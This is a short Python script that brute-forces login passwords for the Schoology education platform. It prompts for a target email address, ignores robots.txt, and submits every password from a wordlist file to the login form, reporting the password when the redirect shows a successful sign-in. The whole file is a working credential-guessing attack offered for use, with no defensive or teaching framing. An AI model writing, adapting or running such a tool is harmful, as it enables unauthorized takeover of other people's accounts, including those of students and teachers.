import mechanize
#import itertools

br=mechanize.Browser()
br.set_handle_equiv(True)
br.set_handle_redirect(True)
br.set_handle_referer(True)
br.set_handle_robots(False)

#combinations =itertools.permutations("i3^4hUP-",8) 
email=raw_input("Enter Schoology Email to Brute Force:")

br.open("https://app.schoology.com/login")
with open('wordlisthere.txt') as f:
    combinations=f.read().splitlines()
for x in combinations:
    br.select_form(nr =0)
    br.form['mail']=email
    br.form['pass']=''.join(x)
    print("Trying password:",''.join(x))
    response=br.submit()
    if response.geturl()=="https://app.schoology.com/home/recent-activity":
                            print "Correct password is ",''.join(x)
                            break
   
